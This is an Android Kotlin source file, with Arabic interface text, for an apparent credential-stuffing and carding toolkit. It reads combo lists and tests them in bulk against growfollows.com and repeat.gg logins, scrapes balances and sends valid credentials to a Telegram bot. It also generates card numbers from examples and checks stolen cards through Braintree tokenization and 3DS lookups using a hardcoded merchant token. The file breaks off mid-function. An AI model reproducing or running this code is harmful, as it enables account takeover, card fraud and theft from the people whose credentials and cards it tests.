package com.example

import android.content.ContentResolver
import android.net.Uri
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import okhttp3.FormBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import java.io.BufferedReader
import java.io.InputStreamReader
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicInteger

data class LogItem(
    val id: Int,
    val timestamp: String,
    val info: String,
    val status: String // SUCCESS, FAILED, RETRY, ERROR
)

data class Stats(
    val hit: Int = 0,
    val bad: Int = 0,
    val retry: Int = 0,
    val unknown: Int = 0,
    val total: Int = 0
)

data class CheckerState(
    val loginUrl: String = "",
    val separator: String = ":",
    val delaySeconds: Int = 1,
    val threadCount: Int = 1,
    val selectedFileName: String = "لم يتم اختيار ملف",
    val selectedFileUri: Uri? = null,
    val isRunning: Boolean = false,
    val isPaused: Boolean = false,
    val stats: Stats = Stats(),
    val logs: List<LogItem> = emptyList(),
    val latestResponseHtml: String = "",
    val currentAccountUsername: String = "",
    val currentAccountPassword: String = "",
    val currentIndex: Int = 0,
    val totalCount: Int = 0,
    val testUrlTrigger: Long = 0L,
    val isDesktopMode: Boolean = false,
    val primaryColorHex: String = "#6750A4",
    val pageLoadedTrigger: Long = 0L
)

data class GeneratorState(
    val exampleCards: String = "",
    val count: String = "10",
    val generatedCards: String = "",
    val errorMessage: String? = null
)

data class WebCheckerState(
    val cardsToCheck: String = "",
    val checkUrl: String = "",
    val delaySeconds: String = "3",
    val isChecking: Boolean = false,
    val currentIndex: Int = 0,
    val currentCard: String = "",
    val totalCount: Int = 0
)

data class GrowFollowState(
    val accountList: String = "",
    val threadCount: String = "5",
    val botToken: String = "",
    val chatId: String = "",
    val statusText: String = "جاهز",
    val isRunning: Boolean = false,
    val hits: Int = 0,
    val bad: Int = 0,
    val retry: Int = 0,
    val unknown: Int = 0,
    val logs: List<String> = emptyList()
)

data class RepeatState(
    val accountList: String = "",
    val threadCount: String = "5",
    val botToken: String = "",
    val chatId: String = "",
    val statusText: String = "جاهز",
    val isRunning: Boolean = false,
    val hits: Int = 0,
    val bad: Int = 0,
    val retry: Int = 0,
    val unknown: Int = 0,
    val logs: List<String> = emptyList()
)

data class OtpState(
    val accountList: String = "",
    val threadCount: String = "5",
    val botToken: String = "",
    val chatId: String = "",
    val statusText: String = "جاهز",
    val isRunning: Boolean = false,
    val hits: Int = 0,
    val bad: Int = 0,
    val retry: Int = 0,
    val unknown: Int = 0,
    val logs: List<String> = emptyList()
)

data class HotmailState(
    val accountList: String = "",
    val threadCount: String = "5",
    val botToken: String = "",
    val chatId: String = "",
    val statusText: String = "جاهز",
    val isRunning: Boolean = false,
    val good: Int = 0,
    val bad: Int = 0,
    val twoFa: Int = 0,
    val unknown: Int = 0,
    val logs: List<String> = emptyList()
)

class CheckerViewModel : ViewModel() {
    private val _state = MutableStateFlow(CheckerState())
    val state: StateFlow<CheckerState> = _state.asStateFlow()

    private val _genState = MutableStateFlow(GeneratorState())
    val genState: StateFlow<GeneratorState> = _genState.asStateFlow()

    private val _webState = MutableStateFlow(WebCheckerState())
    val webState: StateFlow<WebCheckerState> = _webState.asStateFlow()

    private val _growState = MutableStateFlow(GrowFollowState())
    val growState: StateFlow<GrowFollowState> = _growState.asStateFlow()

    private val _repeatState = MutableStateFlow(RepeatState())
    val repeatState: StateFlow<RepeatState> = _repeatState.asStateFlow()

    private val _otpState = MutableStateFlow(OtpState())
    val otpState: StateFlow<OtpState> = _otpState.asStateFlow()

    private val _hotmailState = MutableStateFlow(HotmailState())
    val hotmailState: StateFlow<HotmailState> = _hotmailState.asStateFlow()

    fun updateState(transform: CheckerState.() -> CheckerState) {
        _state.update(transform)
    }

    private val patternAnalyzer = PatternAnalyzer()
    private var webJob: Job? = null

    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .build()

    private var checkingJob: Job? = null
    private var pausedFlag = false
    private var stopFlag = false

    private val logsMutex = Mutex()
    private val statsMutex = Mutex()
    private var logCounter = AtomicInteger(0)

    private var accountsQueue = mutableListOf<String>()
    private val queueMutex = Mutex()

    fun updateUrl(url: String) = _state.update { it.copy(loginUrl = url) }
    fun updateSeparator(sep: String) = _state.update { it.copy(separator = sep) }
    fun updateDelay(delay: Int) = _state.update { it.copy(delaySeconds = delay) }
    fun updateThreadCount(count: Int) = _state.update { it.copy(threadCount = count) }
    fun fileSelected(uri: Uri, name: String) = _state.update {
        it.copy(selectedFileUri = uri, selectedFileName = name)
    }

    suspend fun testConnection(): String {
        _state.update { it.copy(testUrlTrigger = System.currentTimeMillis()) }
        return "جاري فتح الرابط في المتصفح الحي..."
    }

    fun startChecking(contentResolver: ContentResolver) {
        val currentState = _state.value
        if (currentState.isRunning || currentState.selectedFileUri == null || currentState.loginUrl.isEmpty()) return

        stopFlag = false
        pausedFlag = false

        _state.update {
            it.copy(
                isRunning = true,
                isPaused = false,
                stats = Stats(),
                logs = emptyList(), // Clear previous logs
                currentIndex = 0,
                totalCount = 0
            )
        }
        logCounter.set(0)

        checkingJob = viewModelScope.launch(Dispatchers.IO) {
            // Read lines
            try {
                accountsQueue.clear()
                contentResolver.openInputStream(currentState.selectedFileUri)?.use { inputStream ->
                    val reader = BufferedReader(InputStreamReader(inputStream))
                    var line: String?
                    while (reader.readLine().also { line = it } != null) {
                        if (line!!.isNotBlank()) accountsQueue.add(line!!)
                    }
                }
            } catch (e: Exception) {
                addLog("خطأ في الملف: ${e.localizedMessage}", "ERROR")
                stopCheckingInternal()
                return@launch
            }

            _state.update { it.copy(totalCount = accountsQueue.size) }

            // Launch single worker since it's UI driven
            launch { workerRoutine() }.join()

            // When all done:
            withContext(Dispatchers.Main) {
                stopCheckingInternal()
                addLog("اكتمل الفحص.", "INFO")
            }
        }
    }

    private suspend fun workerRoutine() {
        var index = 0
        while (currentCoroutineContext().isActive && !stopFlag) {
            if (pausedFlag) {
                delay(500)
                continue
            }

            val account = queueMutex.withLock {
                if (accountsQueue.isEmpty()) null else accountsQueue.removeAt(0)
            } ?: break

            index++
            val sep = if (_state.value.separator == "Tab") "\t" else _state.value.separator
            val parts = account.split(sep, limit = 2)
            
            if (parts.size < 2) {
                updateStats { it.copy(bad = it.bad + 1, total = it.total + 1) }
                addLog("تنسيق غير صالح: $account", "FAILED")
                _state.update { it.copy(currentIndex = index) }
                continue
            }

            val username = parts[0].trim()
            val password = parts[1].trim()

            // Update UI State to trigger WebView load and injection
            _state.update { 
                it.copy(
                    currentAccountUsername = username,
                    currentAccountPassword = password,
                    currentIndex = index,
                    pageLoadedTrigger = 0L // reset trigger
                ) 
            }
            
            addLog("يتم ملء حقول: $username", "INFO")

            // Wait for WebView to finish loading (up to 15 seconds)
            var waited = 0
            while (_state.value.pageLoadedTrigger == 0L && waited < 150 && !stopFlag && !pausedFlag) {
                delay(100)
                waited++
            }
            
            // Now apply the user's requested delay
            delay(_state.value.delaySeconds * 1000L)
            
            updateStats { it.copy(total = it.total + 1, unknown = it.unknown + 1) } // Default state since we don't automatically check hit/bad anymore, or we can just leave it as total
        }
    }

    private suspend fun updateStats(transform: (Stats) -> Stats) {
        statsMutex.withLock {
            _state.update { it.copy(stats = transform(it.stats)) }
        }
    }

    private suspend fun addLog(info: String, status: String) {
        val time = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
        val item = LogItem(
            id = logCounter.incrementAndGet(),
            timestamp = time,
            info = info,
            status = status
        )
        logsMutex.withLock {
            _state.update {
                // Keep the last 1000 items to avoid unhandled memory growth in UI
                val newLogs = it.logs.toMutableList()
                newLogs.add(item)
                if (newLogs.size > 1000) newLogs.removeAt(0)
                it.copy(logs = newLogs)
            }
        }
    }

    fun pauseChecking() {
        if (_state.value.isRunning) {
            pausedFlag = true
            _state.update { it.copy(isPaused = true) }
        }
    }

    fun resumeChecking() {
        if (_state.value.isRunning && pausedFlag) {
            pausedFlag = false
            _state.update { it.copy(isPaused = false) }
        }
    }

    fun stopChecking() {
        stopFlag = true
        stopCheckingInternal()
    }

    private fun stopCheckingInternal() {
        checkingJob?.cancel()
        _state.update { it.copy(isRunning = false, isPaused = false) }
    }

    // --- Generator Functions ---
    fun updateExampleCards(text: String) { _genState.update { it.copy(exampleCards = text) } }
    fun updateGenCount(count: String) { _genState.update { it.copy(count = count) } }
    
    fun generateCards() {
        try {
            val examples = _genState.value.exampleCards.lines().filter { it.isNotBlank() }.map { it.trim() }
            if (examples.isEmpty()) {
                _genState.update { it.copy(errorMessage = "يرجى إدخال 1 مثال على الأقل.") }
                return
            }
            val count = _genState.value.count.toIntOrNull() ?: 10
            val generated = patternAnalyzer.generateCards(examples, count)
            _genState.update { it.copy(generatedCards = generated.joinToString("\n"), errorMessage = null) }
        } catch (e: Exception) {
            _genState.update { it.copy(errorMessage = e.message) }
        }
    }
    
    fun setWebCheckerCards(cards: String) {
        _webState.update { it.copy(cardsToCheck = cards) }
    }
    
    // --- Web Checker Functions ---
    fun updateWebUrl(url: String) { _webState.update { it.copy(checkUrl = url) } }
    fun updateWebCards(cards: String) { _webState.update { it.copy(cardsToCheck = cards) } }
    fun updateWebDelay(delay: String) { _webState.update { it.copy(delaySeconds = delay) } }
    
    fun startWebChecking() {
        if (_webState.value.isChecking) return
        val cardsList = _webState.value.cardsToCheck.lines().filter { it.isNotBlank() }.map { it.trim() }
        if (cardsList.isEmpty() || _webState.value.checkUrl.isBlank()) return
        
        val delaySecs = _webState.value.delaySeconds.toLongOrNull() ?: 3L
        
        _webState.update { 
            it.copy(
                isChecking = true, 
                totalCount = cardsList.size, 
                currentIndex = 0,
                currentCard = cardsList.firstOrNull() ?: ""
            ) 
        }
        
        webJob = viewModelScope.launch(Dispatchers.Main) { 
            for (i in cardsList.indices) {
                if (!isActive) break
                val card = cardsList[i]
                _webState.update { it.copy(currentIndex = i + 1, currentCard = card) }
                
                // WebView UI will observe currentCard and URL and load automatically
                delay(delaySecs * 1000)
            }
            _webState.update { it.copy(isChecking = false, currentCard = "تم الانتهاء من الفحص.") }
        }
    }
    
    fun stopWebChecking() {
        webJob?.cancel()
        _webState.update { it.copy(isChecking = false) }
    }

    // --- GrowFollows Checker Functions ---
    fun updateGrowAccountList(text: String) { _growState.update { it.copy(accountList = text) } }
    fun updateGrowBotToken(text: String) { _growState.update { it.copy(botToken = text) } }
    fun updateGrowChatId(text: String) { _growState.update { it.copy(chatId = text) } }
    fun updateGrowThreads(text: String) { _growState.update { it.copy(threadCount = text) } }

    private var growJob: Job? = null
    
    fun startGrowChecking() {
        if (_growState.value.isRunning) return
        val accounts = _growState.value.accountList.lines().filter { it.isNotBlank() }.map { it.trim() }
        if (accounts.isEmpty()) {
            _growState.update { it.copy(statusText = "الرجاء إدخال الحسابات أولاً.") }
            return
        }

        _growState.update { 
            it.copy(
                isRunning = true,
                hits = 0,
                bad = 0,
                retry = 0,
                unknown = 0,
                logs = emptyList(),
                statusText = "جاري الفحص..."
            )
        }

        growJob = viewModelScope.launch(Dispatchers.IO) {
            val numThreads = _growState.value.threadCount.toIntOrNull() ?: 5
            val accountQueue = kotlinx.coroutines.channels.Channel<String>(kotlinx.coroutines.channels.Channel.UNLIMITED)
            accounts.forEach { accountQueue.trySend(it) }
            accountQueue.close()

            val workers = List(numThreads) {
                launch {
                    for (combo in accountQueue) {
                        checkGrowAccount(combo)
                    }
                }
            }
            workers.joinAll()
            _growState.update { it.copy(isRunning = false, statusText = "تم الانتهاء.") }
        }
    }

    fun stopGrowChecking() {
        growJob?.cancel()
        _growState.update { it.copy(isRunning = false, statusText = "تم التوقف.") }
    }

    private suspend fun checkGrowAccount(combo: String) {
        if (!combo.contains(":")) {
            addGrowLog("$combo -> صيغة خاطئة")
            updateGrowStats(bad = 1)
            return
        }
        val parts = combo.split(":", limit = 2)
        val us = parts[0].trim()
        val ps = parts[1].trim()

        val workerClient = OkHttpClient.Builder()
            .cookieJar(object : okhttp3.CookieJar {
                 private val cookieStore = mutableListOf<okhttp3.Cookie>()
                 override fun saveFromResponse(url: okhttp3.HttpUrl, cookies: List<okhttp3.Cookie>) {
                     cookieStore.addAll(cookies)
                 }
                 override fun loadForRequest(url: okhttp3.HttpUrl): List<okhttp3.Cookie> {
                     return cookieStore
                 }
            })
            .connectTimeout(15, TimeUnit.SECONDS)
            .readTimeout(15, TimeUnit.SECONDS)
            .build()

        try {
            // STEP 1: GET Base to fetch CSRF
            val getRequest = Request.Builder()
                .url("https://growfollows.com/")
                .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                .header("Accept", "*/*")
                .build()

            var csrfToken = ""
            workerClient.newCall(getRequest).execute().use { response ->
                val body = response.body?.string() ?: ""
                val regex = """name="_csrf"\s+value="(.*?)"""".toRegex()
                val match = regex.find(body)
                if (match != null) {
                    csrfToken = match.groupValues[1]
                }
            }

            if (csrfToken.isEmpty()) {
                updateGrowStats(unknown = 1)
                addGrowLog("$us:$ps -> لم يتم العثور على CSRF (UNKNOWN)")
                return
            }

            // STEP 2: POST
            val postBody = FormBody.Builder()
                .add("LoginForm[username]", us)
                .add("LoginForm[password]", ps)
                .add("_csrf", csrfToken)
                .build()

            val postRequest = Request.Builder()
                .url("https://growfollows.com/")
                .header("Host", "growfollows.com")
                .header("Connection", "keep-alive")
                .header("Cache-Control", "max-age=0")
                .header("Origin", "https://growfollows.com")
                .header("Content-Type", "application/x-www-form-urlencoded")
                .header("Upgrade-Insecure-Requests", "1")
                .header("User-Agent", "Mozilla/5.0")
                .header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
                .header("Referer", "https://growfollows.com/")
                .post(postBody)
                .build()

            var hit = false
            workerClient.newCall(postRequest).execute().use { response ->
                val body = response.body?.string()?.lowercase() ?: ""
                val code = response.code

                if ((code == 200 || code == 302) && (body.contains("logout") || body.contains("dashboard"))) {
                    hit = true
                } else if (code == 401 || body.contains("incorrect username or password")) {
                    updateGrowStats(bad = 1)
                    addGrowLog("$us:$ps -> BAD")
                    return
                } else if (code == 429) {
                    updateGrowStats(retry = 1)
                    addGrowLog("$us:$ps -> RATELIMIT (RETRY)")
                    return
                } else {
                    updateGrowStats(unknown = 1)
                    addGrowLog("$us:$ps -> UNKNOWN (Code: $code)")
                    return
                }
            }

            if (hit) {
                // STEP 3: GET Orders
                val orderRequest = Request.Builder()
                    .url("https://growfollows.com/orders")
                    .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                    .header("Pragma", "no-cache")
                    .header("Accept", "*/*")
                    .build()

                var email = "N/A"
                var balance = "N/A"
                var spend = "N/A"

                workerClient.newCall(orderRequest).execute().use { response ->
                    val body = response.body?.string() ?: ""
                    email = """const point_email\s*=\s*"(.*?)";""".toRegex().find(body)?.groupValues?.get(1) ?: "N/A"
                    balance = """<div class="text">(.*?)</div>""".toRegex().find(body)?.groupValues?.get(1) ?: "N/A"
                    spend = """const totalspend\s*=\s*(.*?);""".toRegex().find(body)?.groupValues?.get(1) ?: "N/A"
                }

                updateGrowStats(hit = 1)
                addGrowLog("HIT -> $us:$ps | Bal: $balance")

                // Send Telegram
                sendTelegramMessage(us, ps, email, balance, spend)
            }

        } catch (e: Exception) {
            updateGrowStats(retry = 1)
            addGrowLog("$us:$ps -> خطأ في الاتصال (RETRY)")
        }
    }

    private suspend fun updateGrowStats(hit: Int = 0, bad: Int = 0, retry: Int = 0, unknown: Int = 0) {
        withContext(Dispatchers.Main) {
            _growState.update { 
                it.copy(
                    hits = it.hits + hit,
                    bad = it.bad + bad,
                    retry = it.retry + retry,
                    unknown = it.unknown + unknown
                )
            }
        }
    }

    private suspend fun addGrowLog(msg: String) {
        withContext(Dispatchers.Main) {
            _growState.update {
                val newLogs = it.logs.toMutableList()
                newLogs.add(0, msg)
                if (newLogs.size > 100) newLogs.removeAt(newLogs.size - 1)
                it.copy(logs = newLogs)
            }
        }
    }

    private fun sendTelegramMessage(us: String, ps: String, email: String, balance: String, spend: String) {
        val botToken = _growState.value.botToken
        val chatId = _growState.value.chatId
        if (botToken.isBlank() || chatId.isBlank()) return

        Thread {
            try {
                val mdMsg = "🔥 HIT\nUSER: $us\nPASS: $ps\n\n📧 Email: $email\n💰 Balance: $balance\n💸 Spend: $spend\n\n👤 Telegram: https://t.me/CodeWithyPython"
                val form = FormBody.Builder()
                    .add("chat_id", chatId)
                    .add("text", mdMsg)
                    .build()
                val request = Request.Builder()
                    .url("https://api.telegram.org/bot$botToken/sendMessage")
                    .post(form)
                    .build()
                client.newCall(request).execute().close()
            } catch (e: Exception) { }
        }.start()
    }

    // --- Repeat Checker Functions ---
    fun updateRepeatAccountList(text: String) { _repeatState.update { it.copy(accountList = text) } }
    fun updateRepeatThreads(text: String) { _repeatState.update { it.copy(threadCount = text) } }
    fun updateRepeatBotToken(text: String) { _repeatState.update { it.copy(botToken = text) } }
    fun updateRepeatChatId(text: String) { _repeatState.update { it.copy(chatId = text) } }

    private var repeatJob: Job? = null
    
    fun startRepeatChecking() {
        if (_repeatState.value.isRunning) return
        val accounts = _repeatState.value.accountList.lines().filter { it.isNotBlank() }.map { it.trim() }
        if (accounts.isEmpty()) {
            _repeatState.update { it.copy(statusText = "الرجاء إدخال الحسابات أولاً.") }
            return
        }

        _repeatState.update { 
            it.copy(
                isRunning = true,
                hits = 0,
                bad = 0,
                retry = 0,
                unknown = 0,
                logs = emptyList(),
                statusText = "جاري الفحص..."
            )
        }

        repeatJob = viewModelScope.launch(Dispatchers.IO) {
            val numThreads = _repeatState.value.threadCount.toIntOrNull() ?: 5
            val accountQueue = kotlinx.coroutines.channels.Channel<String>(kotlinx.coroutines.channels.Channel.UNLIMITED)
            accounts.forEach { accountQueue.trySend(it) }
            accountQueue.close()

            val workers = List(numThreads) {
                launch {
                    for (combo in accountQueue) {
                        checkRepeatAccount(combo)
                    }
                }
            }
            workers.joinAll()
            _repeatState.update { it.copy(isRunning = false, statusText = "تم الانتهاء.") }
        }
    }

    fun stopRepeatChecking() {
        repeatJob?.cancel()
        _repeatState.update { it.copy(isRunning = false, statusText = "تم التوقف.") }
    }
    
    private suspend fun checkRepeatAccount(combo: String) {
        if (!combo.contains(":")) {
            addRepeatLog("$combo -> صيغة خاطئة")
            updateRepeatStats(bad = 1)
            return
        }
        val parts = combo.split(":", limit = 2)
        val email = parts[0].trim()
        val password = parts[1].trim()

        val workerClient = OkHttpClient.Builder()
            .connectTimeout(15, TimeUnit.SECONDS)
            .readTimeout(15, TimeUnit.SECONDS)
            .build()
            
        // 1. Google Firebase Login
        val loginUrl = "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyDEcZajmIwWbQ2Az-mq_wkOrPGgbdc7BWk"
        
        val jsonPayload = """
            {
                "returnSecureToken": true,
                "email": "$email",
                "password": "$password",
                "clientType": "CLIENT_TYPE_WEB"
            }
        """.trimIndent()
        
        val loginBody = RequestBody.create("application/json".toMediaTypeOrNull(), jsonPayload)
        
        val loginRequest = Request.Builder()
            .url(loginUrl)
            .header("Content-Type", "application/json")
            .header("Origin", "https://www.repeat.gg")
            .header("Referer", "https://www.repeat.gg/")
            .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .post(loginBody)
            .build()
            
        try {
            var hit = false
            var idToken = ""
            var displayName = "N/A"
            
            workerClient.newCall(loginRequest).execute().use { response ->
                val body = response.body?.string() ?: ""
                
                if (response.isSuccessful && body.contains("idToken")) {
                    hit = true
                    try {
                        val json = org.json.JSONObject(body)
                        idToken = json.optString("idToken", "")
                        displayName = json.optString("displayName", "N/A")
                    } catch (e: Exception) {}
                } else if (body.contains("INVALID_PASSWORD") || body.contains("EMAIL_NOT_FOUND")) {
                    updateRepeatStats(bad = 1)
                    addRepeatLog("$email:$password -> BAD")
                    return
                } else {
                    updateRepeatStats(unknown = 1)
                    addRepeatLog("$email:$password -> UNKNOWN (Login failed)")
                    return
                }
            }
            
            if (hit && idToken.isNotEmpty()) {
                val detailsUrl = "https://www.repeat.gg/api/user-details/v1"
                val detailsRequest = Request.Builder()
                    .url(detailsUrl)
                    .header("authorization", "Bearer ${idToken}")
                    .header("referer", "https://www.repeat.gg/platform")
                    .header("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                    .build()
                    
                var balance = "0"
                var coins = "0"
                var country = "Unknown"
                var blockCapture = false
                
                workerClient.newCall(detailsRequest).execute().use { response ->
                    if (response.isSuccessful) {
                        val detailsBody = response.body?.string() ?: ""
                        try {
                            val json = org.json.JSONObject(detailsBody)
                            balance = json.optString("cashBalance", "0")
                            coins = json.optString("coinBalance", "0")
                            country = json.optString("country", "Unknown")
                        } catch (e: Exception) {}
                    } else {
                        blockCapture = true
                    }
                }
                
                updateRepeatStats(hit = 1)
                if (blockCapture) {
                    addRepeatLog("HIT (No Cap) -> $email:$password")
                    sendRepeatTelegram(email, password, displayName, "0", "0", "Unknown")
                } else {
                    addRepeatLog("HIT -> $email | Cash: $balance, Coins: $coins, Country: $country")
                    sendRepeatTelegram(email, password, displayName, balance, coins, country)
                }
            }
        } catch (e: Exception) {
            updateRepeatStats(retry = 1)
            addRepeatLog("$email:$password -> خطأ في الاتصال (RETRY)")
        }
    }
    
    private suspend fun updateRepeatStats(hit: Int = 0, bad: Int = 0, retry: Int = 0, unknown: Int = 0) {
        withContext(Dispatchers.Main) {
            _repeatState.update { 
                it.copy(
                    hits = it.hits + hit,
                    bad = it.bad + bad,
                    retry = it.retry + retry,
                    unknown = it.unknown + unknown
                )
            }
        }
    }

    private suspend fun addRepeatLog(msg: String) {
        withContext(Dispatchers.Main) {
            _repeatState.update {
                val newLogs = it.logs.toMutableList()
                newLogs.add(0, msg)
                if (newLogs.size > 100) newLogs.removeAt(newLogs.size - 1)
                it.copy(logs = newLogs)
            }
        }
    }

    private fun sendRepeatTelegram(email: String, ps: String, name: String, balance: String, coins: String, country: String) {
        val botToken = _repeatState.value.botToken
        val chatId = _repeatState.value.chatId
        if (botToken.isBlank() || chatId.isBlank()) return

        Thread {
            try {
                val mdMsg = "[HIT] $email | Name: $name | Cash: $balance | Coins: $coins | Country: $country | @Real_zezomod"
                val form = FormBody.Builder()
                    .add("chat_id", chatId)
                    .add("text", mdMsg)
                    .build()
                val request = Request.Builder()
                    .url("https://api.telegram.org/bot$botToken/sendMessage")
                    .post(form)
                    .build()
                val client = OkHttpClient()
                client.newCall(request).execute().close()
            } catch (e: Exception) { }
        }.start()
    }
    
    // --- OTP Checker Functions ---
    fun updateOtpAccountList(text: String) { _otpState.update { it.copy(accountList = text) } }
    fun updateOtpBotToken(text: String) { _otpState.update { it.copy(botToken = text) } }
    fun updateOtpChatId(text: String) { _otpState.update { it.copy(chatId = text) } }
    fun updateOtpThreads(text: String) { _otpState.update { it.copy(threadCount = text) } }

    private var otpJob: Job? = null
    
    fun startOtpChecking() {
        if (_otpState.value.isRunning) return
        val accounts = _otpState.value.accountList.lines().filter { it.isNotBlank() }.map { it.trim() }
        if (accounts.isEmpty()) {
            _otpState.update { it.copy(statusText = "الرجاء إدخال بطاقات أولاً.") }
            return
        }

        _otpState.update { 
            it.copy(
                isRunning = true,
                hits = 0,
                bad = 0,
                retry = 0,
                unknown = 0,
                logs = emptyList(),
                statusText = "جاري الفحص..."
            )
        }

        otpJob = viewModelScope.launch(Dispatchers.IO) {
            val numThreads = _otpState.value.threadCount.toIntOrNull() ?: 5
            val accountQueue = kotlinx.coroutines.channels.Channel<String>(kotlinx.coroutines.channels.Channel.UNLIMITED)
            accounts.forEach { accountQueue.trySend(it) }
            accountQueue.close()

            val workers = List(numThreads) {
                launch {
                    for (combo in accountQueue) {
                        checkOtpCard(combo)
                    }
                }
            }
            workers.joinAll()
            _otpState.update { it.copy(isRunning = false, statusText = "تم الانتهاء.") }
        }
    }

    fun stopOtpChecking() {
        otpJob?.cancel()
        _otpState.update { it.copy(isRunning = false, statusText = "تم التوقف.") }
    }
    
    private suspend fun checkOtpCard(combo: String) {
        val parts = combo.split("|")
        if (parts.size < 4) {
            addOtpLog("$combo -> صيغة خاطئة")
            updateOtpStats(bad = 1)
            return
        }
        val n = parts[0].trim()
        val mm = parts[1].trim()
        var yy = parts[2].trim()
        val cvc = parts[3].trim()
        if (yy.startsWith("20") && yy.length == 4) {
            yy = yy.substring(2)
        }

        val workerClient = OkHttpClient.Builder()
            .connectTimeout(15, TimeUnit.SECONDS)
            .readTimeout(15, TimeUnit.SECONDS)
            .build()
            
        try {
            // STEP 1: Tokenize
            val queryPayload = """
                {
                  "clientSdkMetadata": {
                    "source": "client",
                    "integration": "custom",
                    "sessionId": "2589b19d-4228-4255-93c9-ebddab7e232c"
                  },
                  "query": "mutation TokenizeCreditCard(${"$"}input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: ${"$"}input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
                  "variables": {
                    "input": {
                      "creditCard": {
                        "number": "$n",
                        "expirationMonth": "$mm",
                        "expirationYear": "$yy",
                        "cvv": "$cvc"
                      },
                      "options": {
                        "validate": false
                      }
                    }
                  },
                  "operationName": "TokenizeCreditCard"
                }
            """.trimIndent()

            val tokenReq = Request.Builder()
                .url("https://payments.braintree-api.com/graphql")
                .header("authorization", "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjgyNDAxMzAsImp0aSI6ImYwNjA4NThlLWI4MTAtNGI1MS1iZTI0LWNiYTU2MTFmNzI0ZiIsInN1YiI6ImNjenMzcTQ3czlzbjRtOXkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImNjenMzcTQ3czlzbjRtOXkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.s6KDZpuW0flNh1QUEg_RANL5L76yIFQhDC1Beci45-dRAl_CpUyWLYCPXlhE4OK6xxgXeoIrwzmC_S9XYHZGZQ")
                .header("braintree-version", "2018-05-10")
                .header("Content-Type", "application/json")
                .header("origin", "https://assets.braintreegateway.com")
                .header("referer", "https://assets.braintreegateway.com/")
                .post(RequestBody.create("application/json".toMediaTypeOrNull(), queryPayload))
                .build()

            var token = ""
            workerClient.newCall(tokenReq).execute().use { response ->
                val body = response.body?.string() ?: ""
                try {
                    val json = org.json.JSONObject(body)
                    token = json.optJSONObject("data")?.optJSONObject("tokenizeCreditCard")?.optString("token", "") ?: ""
                } catch (e: Exception) {}
            }

            if (token.isEmpty()) {
                updateOtpStats(bad = 1)
                addOtpLog("$combo -> Failed to tokenize")
                return
            }

            // STEP 2: Lookup
            val lookupPayload = """
                {
                  "amount": "48.00",
                  "additionalInfo": {
                    "billingLine1": "New York",
                    "billingCity": "New York",
                    "billingState": "AA",
                    "billingPostalCode": "10080",
                    "billingCountryCode": "US",
                    "billingPhoneNumber": "13478653020",
                    "billingGivenName": "Hoda",
                    "billingSurname": "Alaa"
                  },
                  "dfReferenceId": "0_7c1a4d27-c28e-456b-9907-ab64b192a848",
                  "clientMetadata": {
                    "requestedThreeDSecureVersion": "2",
                    "sdkVersion": "web/3.79.1",
                    "cardinalDeviceDataCollectionTimeElapsed": 411
                  },
                  "authorizationFingerprint": "eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjgyNDAxMzAsImp0aSI6ImYwNjA4NThlLWI4MTAtNGI1MS1iZTI0LWNiYTU2MTFmNzI0ZiIsInN1YiI6ImNjenMzcTQ3czlzbjRtOXkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImNjenMzcTQ3czlzbjRtOXkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.s6KDZpuW0flNh1QUEg_RANL5L76yIFQhDC1Beci45-dRAl_CpUyWLYCPXlhE4OK6xxgXeoIrwzmC_S9XYHZGZQ",
                  "braintreeLibraryVersion": "braintree/web/3.79.1",
                  "_meta": {
                    "merchantAppId": "somersetandwood.com",
                    "platform": "web",
                    "sdkVersion": "3.79.1",
                    "source": "client",
                    "integration": "custom",
                    "integrationType": "custom",
                    "sessionId": "2589b19d-4228-4255-93c9-ebddab7e232c"
                  }
                }
            """.trimIndent()

